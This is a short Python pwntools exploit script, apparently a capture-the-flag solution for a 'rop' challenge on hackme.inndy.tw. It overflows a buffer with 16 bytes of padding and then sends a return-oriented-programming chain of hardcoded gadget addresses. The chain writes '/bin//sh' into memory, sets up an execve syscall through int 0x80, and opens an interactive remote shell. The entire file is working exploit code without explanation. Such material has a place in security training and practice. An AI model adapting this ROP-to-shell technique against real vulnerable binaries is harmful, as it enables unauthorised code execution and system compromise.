#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "hackme.inndy.tw"
port = "7704"


if _local:
	r = process('./rop')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

payload='A' * 16

data = 0x080ea060
# gadgets
mov = 0x0805466b
pop_eax = 0x080b8016
pop_ecx_ebx = 0x0806ed01
pop_edx = 0x0806ecda
int_80 = 0x0806c943

payload += p32(pop_edx) + p32(data)
payload += p32(pop_eax) + "/bin"
payload += p32(mov)

payload += p32(pop_edx) + p32(data+4)
payload += p32(pop_eax) + "//sh"
payload += p32(mov)

payload += p32(pop_edx) + p32(data+8)
payload += p32(pop_eax) + p32(0)
payload += p32(mov)

payload += p32(pop_eax) + p32(0x0b)
payload += p32(pop_ecx_ebx) + p32(0) + p32(data)
payload += p32(pop_edx) + p32(0)

payload += p32(int_80)
# print r. recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()